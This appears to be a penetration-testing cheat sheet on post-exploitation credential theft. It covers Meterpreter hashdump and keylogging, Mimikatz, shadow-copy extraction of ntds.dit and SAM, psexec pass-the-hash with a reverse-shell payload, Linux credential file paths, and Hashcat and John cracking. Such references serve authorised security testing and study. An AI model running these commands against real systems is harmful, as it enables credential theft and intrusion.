---
title: Obtaining and Cracking Passwords
category: Post-Exploitation
order: 6
---

> **Windows** 

Metasploit Key logger for passwords | keyscan_start, keyscan_stop, keyscan_dump
PwDump | Pwdump drops files to disk and caught by AV <br> http://www.tarasco.org/security/pwdump_7/
Fgdump | fgdump drops files to disk and caught by AV <br> Source available to evade AV <br> http://foofus.net/goons/fizzgig/fgdump/downloads.htm#previous-version
Other PWDump Versions | http://www.openwall.com/passwords/windows-pwdump

**[Mimikatz](https://github.com/gentilkiwi/mimikatz)**
1. Determine architecture (32 vs 64 bit)
2. Determine if you have admin privs 
3. [AV Bypass](http://www.blackhillsinfosec.com/?p=5555)

References:
* [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/Mimikatz/)
* [Golden Ticket] (https://www.christophertruncer.com/golden-ticket-generation/) 
* [Mimikatz to dump passwords](http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html) 
* [Domain Passwords](http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html)

**Metasploit hashdump**

{% highlight bash %}
meterpreter >hashdump (from memory)
meterpreter > run hashdump (hash and syskey from registry)
{% endhighlight %}

**Volume Shadow Copy Service (domain controller)**

{% highlight bash %}
cscript vssown.vbs /status or /start or /create /c
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit ntdsbackup.dit 
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM systembackup.bak
copy \\ ? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM sambackup.bak

Analyze with ntds Dump Hash
{% endhighlight %}

Required Tools:
* [vssown vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)  
* [vssown py](https://github.com/MarkBaggett/MarkBaggett/blob/master/vssown.py)
* [ntds Dump Hash](http://csabarta.com/downloads/ntds_dump_hash.zip)

>**Pass the Hash**

***May require RID 500 account due to patch***
 
Windows credential editor | www.ampliasecurity.com/research
Metasploit psexec| <code> use exploit/windows/smb/psexec <br> set RHOST [victim] <br> set PAYLOAD windows/meterpreter/reverse_tcp <br> 	set SMBUser [admin_name]  <br> set SMBPass [admin_hash] <br> exploit </code> 
Nmap nse smb | tbd

> **Linux**

Users and Passwords:

* /etc/passwd and /etc/shadow

Network or WiFi Passwords:

* /etc/NetworkManager/system-connections

Gnome Keyring:

* ~/.gnome/keyrings

> **Password Cracking Tools**

**GPU**

* MD5 Cracker: http://bvernoux.free.fr/md5/index.php
* oclHashcat  and Hashcat (same project)
* CUDA-multiforcer
* aircrack-ng-CUDA
* pyrit (WPA and WPA w/ CoWPAtty)

**CPU**

* John
* Cain (note: wordlist is located at C:\Program file\Cain\Wordlist\Wordlist.txt)


> **John the Ripper**

View Cracked Passwords | <code> ./john --show [password file] </code>
Pause a session | CTRL-C
Kill a session | <code> CTRL-C twice quickly </code>
Restore a session | <code> ./john --restore </code>
Current Status | any key
Customize Session based on password policy (e.g., length) | edit john.conf (Linux) and john.ini (windows)
Combine Shadow and passwd | <code> ./unshadow passwd_copy shadow_copy > combined.txt </code>
Password length Customization | <code> MinLen and MaxLen <code>
Rule Set | [Korelogic](http://contest-2010.korelogic.com/rules.html)

***Useful Links***

* [Getting Started](https://www.tunnelsup.com/getting-started-cracking-password-hashes/)

> **Hashcat**

Usage:
{% highlight bash %}

hashcat -a 0 -m 1000 [NTLMHASHES] wordlists/rockyou.txt -r hob064.rule -o cracked.txt

#Finding kind of hash
hashcat --help | grep NTLM
{% endhighlight %}

Rule Sets:

* [hob0Rules](https://github.com/praetorian-inc/Hob0Rules)

Useful Links:

* [SANS - Breaking Various Hashes](https://pen-testing.sans.org/blog/2017/10/04/how-to-guide-cracking-into-piles-of-files)
* [/etc/shadow](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/)

>**Cain**

Word List location | C:\Program file\Cain\Wordlist\Wordlist.txt
Password Dictionary restarts at last point | Right-Click the dictionary-> select Reset initial file position

> **Password Lists**

Example Hashes | https://hashcat.net/wiki/doku.php?id=example_hashes
Password Lists in Kali | /usr/share/wordlists/
Tailor Password list to policy | <code> > pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p â€“s  <br> > pw-inspector -i /usr/share/wordlists/nmap.lst -o /root/passes.txt -m 6 -M 1 </code>
Combine Word Lists | <code> > cat wordlist.txt <wordlist2.txt....> | sort | uniq > dictionary.txt </code>
Word List from Website | <code> > mkdir /tmp/source <br> > cd /tmp/source <br> > wget -r -l [Page Depth] [target_website] <br> > cd .. <br> grep -h -r """" source | tr '[:space:]' '\n' | sort | uniq >wordlist.lst <br> > grep -v '<' wordlist.lst > newlist.lst </code>
Password Lists | https://downloads.skullsecurity.org/passwords/
Weakpass | https://weakpass.com/wordlist/online
Crackstation | https://crackstation.net/
Hashes.org | https://hashes.org/search.php
Practice Hashes | http://contest-2012.korelogic.com/


> **CISCO Group Password**

From Kali:<br>
<code>cisco-decrypt (GroupPassword)</code>


> **Mimikatz from Memory Image**

<code> vol.py -f system_image.vmem --profile=Win7SP1x64 mimikatz </code>


> **Rainbow Tables**

* http://project-rainbowcrack.com
* http://souceforce.net/projects/ophcrack
* http://lasecwww.epfl.ch/~oechslin/projects/ophcrack



